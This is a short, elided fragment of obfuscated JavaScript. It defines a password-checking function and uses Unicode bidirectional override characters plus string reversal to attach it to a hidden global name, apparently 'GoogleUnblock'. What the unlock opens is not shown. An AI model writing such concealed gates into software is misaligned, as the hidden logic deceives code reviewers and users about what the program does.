    ...
    return {
      ...
      const _0xgu = async (pw) => {
        try {
          ...
          if (_0got.length === _0xwantb.length && _0got.every((b, i) => b === _0xwantb[i])) { _0xopen = true; try { Log.flush(); } catch (e) {} return true; }
          
          return false;
        } catch (e) {  return false; }
      };
      const _0xgr = s => s.replace(/[\u200E\u200F\u202A-\u202E\u2066-\u2069]/g, '').split('').reverse().join('');
      try { window[_0xgr('‮kcolbUelgooG‬')] = _0xgu; } catch (e) {}
